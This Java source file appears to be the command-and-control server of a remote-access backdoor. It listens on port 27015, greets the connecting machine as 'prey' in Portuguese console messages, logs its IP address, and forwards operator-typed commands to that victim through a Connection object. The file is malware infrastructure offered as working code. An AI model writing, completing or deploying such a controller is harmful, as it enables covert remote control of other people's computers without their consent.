package app;

import network.ClientConnection;
import network.Connection;
import network.Message;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import static utils.ServerUtils.printCommandList;
import static utils.ServerUtils.startOnNewThread;

public class Server {

    private static ServerSocket serverSocket;
    private final static List<ClientConnection> targets = new ArrayList<>();

    public static void main(String[] args) throws IOException {
        Scanner sc = new Scanner(System.in);
        serverSocket = new ServerSocket(27015);
        System.out.println("Podipa vamo esperar o gatao entrar");
        Socket clientSocket = serverSocket.accept();

        System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress());

        Connection targetConnection = new Connection(clientSocket);

        runHandlerThread(targetConnection);

        String command;
        do {
            command = sc.nextLine();
            if (!isNullOrEmpty(command)) {
                switch(command) {
                    case "quit":
                        break;
                    case "help":
                        printCommandList();
                        break;
                    default:
                        targetConnection.sendMessage(new Message(command));
                }
            }
        } while (command != "quit");
    }

    private static void runHandlerThread(Connection targetConnection) {
        ClientConnection connection = new ClientConnection(targetConnection);
        targets.add(connection);
        startOnNewThread(connection);
    }

    private static boolean isNullOrEmpty(String command) {
        return command == null || command.isEmpty();
    }


}
